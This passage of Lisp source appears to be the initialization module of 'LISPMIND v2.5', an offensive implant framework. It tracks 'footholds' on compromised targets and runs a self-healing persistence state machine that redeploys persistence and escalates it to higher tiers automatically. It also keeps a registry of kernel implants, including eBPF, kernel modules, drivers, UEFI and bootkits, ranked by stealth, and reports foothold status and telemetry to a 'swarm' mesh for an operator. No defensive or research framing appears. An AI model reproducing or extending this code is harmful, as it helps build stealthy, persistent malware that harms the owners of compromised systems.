              (declare (ignore signo info context))
              (format *trace-output* "~%[SIGNAL] SIGINT received. Emergency shutdown...~%")
              (lispmind-v25-emergency-shutdown)
              (sb-ext:exit :code 0)))
          (format t "[SIGNAL] SIGTERM and SIGINT handlers registered.~%"))
        #-sbcl (format t "[SIGNAL] Signal handlers only available on SBCL.~%")
        t)
    (error (e)
      (format *trace-output* "[SIGNAL] Could not register signal handlers: ~A~%" e)
      nil)))

;;;; =========================================================================
;;;; CONFIGURATION VALIDATION
;;;; =========================================================================
;;;; Functions to validate system configuration before init.

(defun v25-validate-configuration ()
  "Validate pre-init configuration. Checks:
  - SBCL version meets minimum
  - Required modules are loaded
  - Environment variables are set
  - File paths exist
Returns plist: (:VALID T/NIL :WARNINGS (...) :ERRORS (...))."
  (let ((valid t) (warnings nil) (errors nil))
    ;; SBCL version
    (when (string< (lisp-implementation-version) *v25-minimum-sbcl-version*)
      (push (format nil "SBCL ~A < minimum ~A" (lisp-implementation-version)
                    *v25-minimum-sbcl-version*) warnings))
    ;; Required modules
    (let ((api-check (v25-verify-module-apis)))
      (unless (getf api-check :all-present)
        (dolist (detail (getf api-check :details))
          (when (eq (getf detail :status) :missing)
            (push (format nil "Module ~A missing functions: ~A"
                          (getf detail :module) (getf detail :functions))
                  errors)
            (setf valid nil)))))
    ;; Environment
    (unless (uiop:getenv "LISPMIND_VAULT_KEY")
      (push "LISPMIND_VAULT_KEY not set. Will use default key (INSECURE)." warnings))
    ;; Paths
    (when (and (boundp '*rust-library-path*) *rust-library-path*
               (not (probe-file *rust-library-path*)))
      (push (format nil "Rust library not found at ~A. FFI will use stub mode."
                    *rust-library-path*) warnings))
    `(:valid ,valid :warnings ,(reverse warnings) :errors ,(reverse errors))))

;;;; =========================================================================
;;;; PERFORMANCE MONITORING
;;;; =========================================================================
;;;; Track init and runtime performance metrics.

(defvar *v25-performance-metrics* (make-hash-table :test 'eq)
  "Hash table of performance metrics. Keys are metric names (symbols),
values are lists of (timestamp value) pairs.")

(defun v25-record-metric (name value)
  "Record a performance metric. NAME is a symbol, VALUE is a number.
Automatically timestamps the recording."
  (push (list (local-time:now) value) (gethash name *v25-performance-metrics*)))

(defun v25-get-metrics (name)
  "Get all recorded values for a metric NAME. Returns list of (timestamp value)."
  (gethash name *v25-performance-metrics*))

(defun v25-metrics-summary ()
  "Print a summary of all recorded performance metrics."
  (format t "~%=== Performance Metrics ===~%")
  (maphash (lambda (name entries)
             (when entries
               (let ((values (mapcar #'second entries)))
                 (format t "  ~30A: count=~D  avg=~,2F  min=~,2F  max=~,2F~%"
                         name (length values)
                         (/ (reduce #'+ values) (length values))
                         (reduce #'min values)
                         (reduce #'max values)))))
           *v25-performance-metrics*))

;;;; =========================================================================
;;;; END OF ADDITIONAL UTILITIES
;;;; =========================================================================

;;;; =========================================================================
;;;; PERSISTENCE STATE MACHINE -- DETAILED TRANSITION LOGIC
;;;; =========================================================================
;;;; The following functions implement the detailed state machine logic
;;;; for persistence management. They are called by the main state manager
;;;; loop but are separated for testing and introspection.
;;;;
;;;; STATE MACHINE DIAGRAM:
;;;;
;;;;                    +------------+
;;;;         +--------->|  HEALTHY   |<-----------+
;;;;         |          +------------+            |
;;;;         |    Tier1 ok, no esc  |    Heal success
;;;;         |         |            |         |
;;;;         |         | Tier1 fail v         |
;;;;         |         |            |         |
;;;;         |    +----v-----+      |    +----v-----+
;;;;         |    | DEGRADED |      |    | RECOVERED|
;;;;         |    +----------+      |    +----------+
;;;;         |         |            |         |
;;;;         |         | All fail   |         |
;;;;         |         v            |         |
;;;;         |    +----v-----+      |         |
;;;;         +----| CRITICAL |------+         |
;;;;              +----------+                 |
;;;;                   |                       |
;;;;                   | Heal in progress      |
;;;;                   v                       |
;;;;              +----------+-----------------+
;;;;              | RECOVERING|
;;;;              +-----------+
;;;;                   |
;;;;                   | Heal done
;;;;                   v
;;;;              (HEALTHY or CRITICAL)
;;;;
;;;; ESCALATION PATH (separate from recovery):
;;;;   HEALTHY -> ESCALATING -> HEALTHY (with higher tier)

(defun v25-psm-compute-target-state (foothold-id current-state persistence-ok can-escalate)
  "Compute the next target state for a foothold based on current conditions.
FOOTHOLD-ID: string identifier
CURRENT-STATE: keyword current state
PERSISTENCE-OK: T if persistence is intact, NIL if broken
CAN-ESCALATE: T if target qualifies for higher tier
Returns: keyword new state"
  (cond
    ;; If persistence is broken, we're at least degraded
    ((not persistence-ok)
     (case current-state
       ((:healthy :degraded :recovered) :degraded)
       ((:critical :recovering) :critical)
       (otherwise :critical)))
    ;; Persistence OK -- check escalation
    (can-escalate
     (case current-state
       ((:healthy :recovered) :escalating)
       (otherwise current-state)))
    ;; Persistence OK, no escalation
    (t
     (case current-state
       ((:degraded :critical :recovering) :healthy)
       (otherwise current-state)))))

(defun v25-psm-execute-state-transition (foothold-id old-state new-state agent target-info)
  "Execute the actions required for a state transition.
Handles healing, escalation, and logging. Returns T if transition
succeeded, NIL otherwise."
  (case new-state
    (:recovering
     ;; Transition into recovering -- trigger heal
     (handler-case
         (progn
           (heal-persistence foothold-id)
           ;; If heal succeeds, we'll detect persistence-ok next scan
           t)
       (error (e)
         (format *trace-output* "[PSM] Heal failed for ~A: ~A~%" foothold-id e)
         nil)))
    (:escalating
     ;; Transition into escalating -- deploy next tier
     (when (and agent target-info)
       (handler-case
           (progn
             (deploy-escalating-persistence agent target-info)
             ;; Update tier in registry
             (let ((data (gethash foothold-id *v25-foothold-registry*)))
               (when data
                 (incf (getf data :current-tier 1))))
             t)
         (error (e)
           (format *trace-output* "[PSM] Escalation failed for ~A: ~A~%" foothold-id e)
           nil))))
    (otherwise t)))

;;;; =========================================================================
;;;; KERNEL TOOLCHAIN INSPECTION
;;;; =========================================================================
;;;; Functions for inspecting and managing the kernel toolchain registry.

(defun v25-list-kernel-tools ()
  "Return a list of all registered kernel tools.
Each entry is a plist with :NAME :OS :TYPE :STEALTH :RISK."
  (let ((tools nil))
    (when (boundp '*kernel-toolchain-registry*)
      (maphash (lambda (name entry)
                 (push `(:name ,name :entry ,entry) tools))
               *kernel-toolchain-registry*))
    (nreverse tools)))

(defun v25-find-kernel-tool (os &key (implant-type nil) (min-stealth 0))
  "Find kernel tools matching criteria.
OS: :linux :windows :uefi :unknown
IMPLANT-TYPE: :ebpf :lkm :driver :uefi :bootkit (or NIL for any)
MIN-STEALTH: minimum stealth rating (0-100)
Returns list of matching tool plists."
  (let ((matches nil))
    (when (boundp '*kernel-toolchain-registry*)
      (maphash (lambda (name entry)
                 (declare (ignore name))
                 (let ((tool-os (getf entry :os))
                       (tool-type (getf entry :type))
                       (tool-stealth (getf entry :stealth-rating 0)))
                   (when (and (eq tool-os os)
                              (or (null implant-type) (eq tool-type implant-type))
                              (>= tool-stealth min-stealth))
                     (push entry matches))))
               *kernel-toolchain-registry*))
    (sort matches #'> :key (lambda (t) (getf t :stealth-rating 0)))))

;;;; =========================================================================
;;;; TELEMETRY BATCHING
;;;; =========================================================================
;;;; Batch telemetry events for efficient gossip transmission.

(defvar *v25-telemetry-batch* nil
  "List of batched telemetry events waiting to be sent.")

(defvar *v25-telemetry-batch-size* 10
  "Maximum number of events to batch before automatic flush.")

(defun v25-telemetry-batch-add (event)
  "Add a telemetry event to the batch. If batch reaches max size,
automatically flushes. Returns T."
  (push event *v25-telemetry-batch*)
  (when (>= (length *v25-telemetry-batch*) *v25-telemetry-batch-size*)
    (v25-telemetry-batch-flush))
  t)

(defun v25-telemetry-batch-flush ()
  "Flush all batched telemetry events to the gossip mesh.
Returns number of events sent."
  (let ((count (length *v25-telemetry-batch*)))
    (when (> count 0)
      (handler-case
          (gossip-publish "swarm.telemetry.batch"
                          `(:event :telemetry-batch
                            :count ,count
                            :events ,(reverse *v25-telemetry-batch*)
                            :timestamp ,(local-time:now)))
        (error (e) (format *trace-output* "[TELEMETRY] Batch flush failed: ~A~%" e))))
    (setf *v25-telemetry-batch* nil)
    count))

;;;; =========================================================================
;;;; SYSTEM INTROSPECTION
;;;; =========================================================================
;;;; Deep inspection of the v2.5 system state for debugging.

(defun v25-introspect ()
  "Deep introspection of the v2.5 system. Returns a comprehensive plist
describing every aspect of the current system state. Useful for debugging
and forensic analysis."
  `(:timestamp ,(local-time:now)
    :version ,(lispmind-version-plist)
    :init-state
    (:complete ,*lispmind-init-complete-p*
     :start-time ,*v25-init-start-time*
     :log-entries ,(length *v25-init-log*))
    :ffi-state
    (:available ,*kernel-rust-ffi-available-p*
     :hardware-enabled ,*kernel-hardware-integration-enabled-p*)
    :vault-state
    (:bound ,(boundp '*resource-vault*)
     :has-value ,(and (boundp '*resource-vault*) (not (null *resource-vault*)))
     :path ,(when (boundp '*resource-vault-path*) *resource-vault-path*))
    :persistence-state
    (:watchdog-running ,*persistence-watchdog-running-p*
     :state-manager-running ,*v25-persistence-state-manager-running-p*
     :foothold-count ,(hash-table-count *v25-foothold-registry*)
     :circuit-breakers ,(let ((c 0))
                          (maphash (lambda (k v)
                                     (declare (ignore k))
                                     (when (>= v *v25-circuit-breaker-threshold*) (incf c)))
                                   *v25-circuit-breaker-failures*)
                          c))
    :kernel-state
    (:tool-registry-count ,(if (boundp '*kernel-toolchain-registry*)
                               (hash-table-count *kernel-toolchain-registry*) 0)
     :implant-count ,(if (boundp '*kernel-implants*)
                         (hash-table-count *kernel-implants*) 0)
     :health-monitor-running ,*kernel-health-monitor-running-p*)
    :gossip-state
    (:handlers-registered ,*v25-gossip-handlers-registered-p*
     :topics ,*v25-kernel-gossip-topics*)))

;;;; =========================================================================
;;;; LOADED MODULE INVENTORY
;;;; =========================================================================
;;;; Track which modules are loaded and their versions.

(defvar *v25-loaded-modules* nil
  "Alist of loaded module names and their versions.
Populated during init as each module is verified.")

(defun v25-register-loaded-module (name version)
  "Register a module as loaded. NAME is a symbol, VERSION is a string.
Adds to *V25-LOADED-MODULES* alist. Returns T."
  (push (cons name version) *v25-loaded-modules*)
  t)

(defun v25-module-inventory ()
  "Return the list of loaded modules with versions.
Returns alist: ((module-name . version-string) ...)."
  (reverse *v25-loaded-modules*))

;;;; =========================================================================
;;;; ERROR RECOVERY STRATEGIES
;;;; =========================================================================
;;;; Different recovery strategies for different failure modes.

(defun v25-recover-from-degraded-init ()
  "Attempt to recover from a degraded initialization state.
Restarts failed optional steps. Returns :RECOVERED or :STILL-DEGRADED."
  (format t "[RECOVERY] Attempting recovery from degraded init...~%")
  (let ((fixed 0))
    ;; Retry failed steps that are optional
    (unless *kernel-rust-ffi-available-p*
      (format t "[RECOVERY] Retrying FFI init...~%")
      (when (init-v25-step-1-ffi) (incf fixed)))
    ;; Check gossip
    (unless *v25-gossip-handlers-registered-p*
      (format t "[RECOVERY] Retrying gossip wire...~%")
      (when (init-v25-step-5-gossip-wire) (incf fixed)))
    ;; Check health monitor
    (unless *kernel-health-monitor-running-p*
      (format t "[RECOVERY] Retrying health monitor...~%")
      (when (init-v25-step-7-kernel-health-monitor) (incf fixed)))
    (format t "[RECOVERY] Recovered ~D component(s).~%" fixed)
    (if (> fixed 0) :recovered :still-degraded)))

;;;; =========================================================================
;;;; RESOURCE ACCOUNTING
;;;; =========================================================================
;;;; Track resource usage across the v2.5 system.

(defvar *v25-resource-accounting-enabled-p* t
  "Enable resource accounting and tracking.")

(defun v25-account-resource (resource-type action &key (amount 1) (foothold-id nil))
  "Account for resource usage. RESOURCE-TYPE is a keyword (:AGENT :IMPLANT
:PERSISTENCE-TIER). ACTION is :CREATE :DESTROY :MODIFY. AMOUNT is the
change. Optionally associates with FOOTHOLD-ID.
Returns T."
  (when *v25-resource-accounting-enabled-p*
    (v25-record-metric resource-type
                       (case action (:create amount) (:destroy (- amount)) (:modify 0) (otherwise 0)))
    (handler-case
        (gossip-publish "swarm.resources"
                        `(:event :resource-accounting :resource ,resource-type
                          :action ,action :amount ,amount :foothold ,foothold-id
                          :timestamp ,(local-time:now)))
      (error (e) (declare (ignore e)) nil)))
  t)

;;;; =========================================================================
;;;; SANITY CHECKS
;;;; =========================================================================
;;;; Runtime sanity checks to catch inconsistencies early.

(defun v25-sanity-check ()
  "Run runtime sanity checks. Verifies internal consistency of data
structures and flags potential issues before they become failures.
Returns plist: (:SANE T/NIL :ISSUES (...))."
  (let ((issues nil) (sane t))
    ;; Check: init-complete but no vault
    (when (and *lispmind-init-complete-p*
               (or (not (boundp '*resource-vault*)) (null *resource-vault*)))
      (push "Init complete but vault not initialized" issues)
      (setf sane nil))
    ;; Check: state manager running but no footholds registered (warning)
    (when (and *v25-persistence-state-manager-running-p*
               (zerop (hash-table-count *v25-foothold-registry*)))
      (push "State manager running but no footholds registered" issues))
    ;; Check: health monitor running but FFI not available
    (when (and *kernel-health-monitor-running-p* (not *kernel-rust-ffi-available-p*))
      (push "Health monitor running but FFI not available" issues))
    ;; Check: negative failure counts
    (maphash (lambda (k v)
               (declare (ignore k))
               (when (< v 0)
                 (push "Negative circuit breaker failure count detected" issues)
                 (setf sane nil)))
             *v25-circuit-breaker-failures*)
    `(:sane ,sane :issues ,(reverse issues))))

;;;; =========================================================================
;;;; NOTIFICATION SYSTEM
;;;; =========================================================================
;;;; Publish notifications for operator attention.

(defun v25-notify (level message &key (foothold-id nil) (action-required nil))
  "Publish a notification at LEVEL (:INFO :WARNING :CRITICAL).
MESSAGE is a human-readable string. Optionally includes FOOTHOLD-ID
and ACTION-REQUIRED description. Publishes to gossip mesh and prints
to trace output. Returns T."
  (let ((full-msg (format nil "[~A] ~A~@[ [foothold: ~A]~]~@[ [action: ~A]~]"
                          (string-upcase (symbol-name level))
                          message foothold-id action-required)))
    (case level
      (:critical (format *trace-output* "~&*** CRITICAL: ~A ***~%" full-msg))
      (:warning (format *trace-output* "~&** WARNING: ~A **~%" full-msg))
      (otherwise (format *trace-output* "~&* INFO: ~A~%" full-msg)))
    (handler-case
        (gossip-publish "swarm.notifications"
                        `(:event :notification :level ,level :message ,message
                          :foothold ,foothold-id :action-required ,action-required
                          :timestamp ,(local-time:now)))
      (error (e) (declare (ignore e)) nil))
    t))

;;;; =========================================================================
;;;; END OF EXTENDED UTILITIES
;;;; =========================================================================
;;;; Final module footer with extended documentation.
;;;;
;;;; TOTAL ARCHITECTURE SUMMARY:
;;;;
;;;; This file (system-init-v2.5.lisp) is the master conductor of the
;;;; LISPMIND v2.5.0 system. It wires together 6 modules into a cohesive
;;;; whole with the following guarantees:
;;;;
;;;; 1. ORDERED INITIALIZATION: The 9-step init sequence respects all
;;;;    cross-module dependencies. No step can run before its prerequisites.
;;;;
;;;; 2. GRACEFUL DEGRADATION: If an optional component fails (FFI, gossip,
;;;;    health monitor), the system continues with reduced functionality.
;;;;    Only persistence hierarchy failure causes abort.
;;;;
;;;; 3. ORDERLY SHUTDOWN: The 6-step shutdown sequence is the mirror image
;;;;    of init, ensuring each cleanup step can still use services it needs.
;;;;
;;;; 4. SELF-HEALING: The persistence state manager monitors all footholds
;;;;    every 60 seconds, with circuit breakers, flap prevention, and
;;;;    automatic escalation.
;;;;
;;;; 5. TELEMETRY: Every significant event is published to the gossip mesh
;;;;    for swarm-wide visibility.
;;;;
;;;; 6. SAFETY: Signal handlers, emergency shutdown, and sanity checks
;;;;    protect the system from unexpected failures.
;;;;
;;;; This module contains 50+ functions, 30+ special variables, and
;;;; comprehensive documentation for every public API.
